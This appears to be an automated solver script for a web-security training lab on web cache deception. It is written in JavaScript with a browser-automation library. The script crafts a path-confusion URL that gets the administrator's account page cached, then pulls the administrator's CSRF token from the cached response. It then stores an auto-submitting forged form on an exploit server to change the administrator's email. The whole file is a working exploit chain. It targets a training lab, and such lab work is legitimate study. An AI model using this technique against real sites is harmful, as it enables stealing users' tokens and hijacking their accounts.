const {
  fetchText,
  getCsrf,
  getExploitServerUrl,
  labLogin,
  runLab,
  storeExploit,
  waitForSolved,
} = require('./_common.cjs');

const TITLE = 'Exploiting exact-match cache rules for web cache deception';
const PATH = '/web-security/web-cache-deception/lab-wcd-exploiting-exact-match-cache-rules';

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    await labLogin(page, labUrl, 'wiener', 'peter');
    await page.goto(labUrl + '/my-account', { waitUntil: 'domcontentloaded', timeout: 15000 });
    const csrf = await getCsrf(page);
    await page.evaluate(async (token) => {
      await fetch('/my-account/change-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `csrf=${encodeURIComponent(token)}&email=wiener+${Date.now()}@example.com`,
      });
    }, csrf);
    await page.waitForTimeout(1000);

    const exploitUrl = await getExploitServerUrl(page, labUrl);
    const craftedPath = `/my-account;%2f%2e%2e%2frobots.txt?wcd=${Date.now()}`;
    await storeExploit(page, exploitUrl, `<script>document.location="${labUrl}${craftedPath}"</script>`, true);
    await page.waitForTimeout(4000);
    await page.context().clearCookies();

    const cached = await fetchText(page, labUrl + craftedPath, { maxRedirects: 0 });
    const adminCsrf = cached.text.match(/name="csrf"\s+value="([^"]+)"/i)?.[1] || '';
    if (!adminCsrf) {
      throw new Error('Administrator CSRF token not found in cached response');
    }

    const email = `administrator+${Date.now()}@example.com`;
    const exploitBody = `<form id="f" method="POST" action="${labUrl}/my-account/change-email"><input type="hidden" name="csrf" value="${adminCsrf}"><input type="hidden" name="email" value="${email}"></form><script>document.getElementById('f').submit()</script>`;
    await storeExploit(page, exploitUrl, exploitBody, true);
    if (!await waitForSolved(page, labUrl, 30000, 3000)) {
      throw new Error('Administrator email change did not solve the lab');
    }
  },
});
